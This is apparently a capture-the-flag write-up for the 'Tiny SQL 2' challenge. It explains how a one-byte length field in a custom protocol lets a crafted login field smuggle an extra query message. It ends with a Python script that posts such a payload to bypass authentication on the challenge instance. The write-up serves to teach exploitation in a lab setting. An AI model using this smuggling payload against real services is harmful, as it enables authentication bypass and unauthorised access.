#### Tiny SQL 2
- points earned: 302
#### Where's the flag?
- The flag is loaded into the `app.py` file via an environment variable and used in the response to the `/forum/post/<int:post_id>` route if `post_id` is 3.
#### Notes / Intuition
- This is kind of like a revenge challenge for `Tiny SQL` so read the solution on that one first to get the feel for this application.
- The difference between the 2 apps is that `Tiny SQL 2` introduces some logic to perform parameterized queries.
	```python
	# removed sql injection
	# code, results = conn.query('S:' + request.form['user'] +  ':' + request.form['pass'])
	
	code, results = conn.prepare('S:?:?', (request.form['user'], request.form['pass']))
	```
- Note: I never really got into the bare bones nitty gritty of this challenge but was able to find a solution through a bit of trial and error.
- When a request is sent to the tinysql server it is sent in the following format
	```python
	bytearray(b'p\x05S:?:?b\x01ab\x01ax\x00')
	```
	- `p\x05S:?:?`
		- `p` identified the type of message
			```python
			case b'q': results = getQuery(payload)
			case b'p': results = prepareQuery(payload)
			case b'b': results = bindVariables(payload)
			case b'x': results = executeQuery()
			```
		- `\x05` is the length of the message
		- `S:?:?` is the message.  In this case it's the parameterzed query.
	- `b\x01a`
		- `b` is the message type.  In this case it ends up getting passed to `bindVariables`
		- `\x01` is the length of the message
		- `a` is the message.
	- `b\x01a`
		- Is a duplicate of the above which I had used for testing.
	- `x\x00`
		- `x` is the message type which ends up getting passed to `executeQuery` to tell the tinysql server to run the query and return results.
		- `\x00` a null byte to symbolize the end of the query.
- The main server loop receives a single byte that is the message type, then it receives another byte that is used to indicate the request length.
	```python
	data = conn.recv(1)
		while data and data != b'e':
			try:
				length = int.from_bytes(conn.recv(1), "big")
				payload = conn.recv(length) if data != b'x' else b''
	```
	- This raised a red flag for me because a single byte has a max value of 255 and there is nothing in the main app that limits the length of the query. So technically a query that is larger then 255 bytes can be sent.
	- I have found similar issues like this on live applications that implemented a custom protocol between 2 services.
- At this point I wanted to verify if anything funny might happen if I sent q request with a longer then expected length.
	- initially I tried sending a request where the length of user and password add up to something larger then 255, but through testing I found that a smaller length would suffice.
	- For example, the request below
		```http
		POST /login HTTP/1.1
		Host: me:3000
		Content-Length: 13
		Content-Type: application/x-www-form-urlencoded
		
		user=abcdefg&pass=hijklmnopqrstuv
		```
	- generates the following `tinysql-server` debug logs
		```
		Recieved: b'q' b'S:abc:defghij'
		S:abc:defghij
		2 ['abc', 'defghij']
		b'r:'
		Recieved: b'k' b'mnopqrstuvqxyz'
		b'e:unknown'
		```
	- The things to note here is that
		- The server processed 2 requests, not just one.
		- The 2nd request shows that it received a message type k, which not valid and user supplied.
		- This indicates that I should be able to inject into the query.
- Here I theorized a few different possibilities
	1. Perhaps I can send a single request that results in 2 separate queries where the 2nd query suffices the rest of the logic and allows me to bypass authentication.
	2. Perhaps I can send 2 requests where the 1st request is 1 and a half queries and the 2nd one is is the remaining .5 queries to complete the 2nd query.  This is similar to some request smuggling attacks.
	3. Perhaps I can just send 1 request that just gets interpreted as a single, regular query.
- Looking at the main loop in `tinysql-server.py`, if `results` ever becomes truthy then its value will be returned back to the client of this application.
	```python
	payload = conn.recv(length) if data != b'x' else b''
	print (f"Recieved: {data!r} {payload!r}")
	match data:
		case b'q': results = getQuery(payload)
		case b'p': results = prepareQuery(payload)
		case b'b': results = bindVariables(payload)
		case b'x': results = executeQuery()
		case _:
			results = b'e:unknown'
	if results != None: 
		print (results)
		try: conn.sendall(results)
	```
	- It is because of this fact, I decided to go with option 3 above, 1 request that just gets interpreted as a regular request.
#### Solution
- Like I said previously, I never got in to the bare bones nitty gritty to get a full understanding of what the lengths should be and why.
- My approach was to trial and error based on the debug output of `tinysql-server.py`
- Without too many attempts I got the payload below working where
	- the message type `q` gets interpreted with `S:1#:s:uv`
	- which after being `clean`ed becomes a single paramter query `S:1`
	- and since `q` type messages return a value it gets returned as the query result
	- which allows auth bypass based on the same solution as the original `Tiny SQL` challenge.
	- and with the cookie returned, you can auth to get the flag.
```python
import requests

#host = 'http://127.0.0.1:3000'
host = 'https://tinysql-2-c0d5c153d915a72f.instancer.batmans.kitchen'

data = {
    'user': 'abcdefghij',
    'pass': 'q\x09S:1#:s:uvwxyab'
}
r = requests.post(f'{host}/login', data=data, allow_redirects=False)
print(f'{r.status_code=}')
print(f'{r.headers=}')
print(f'{r.text=}')
```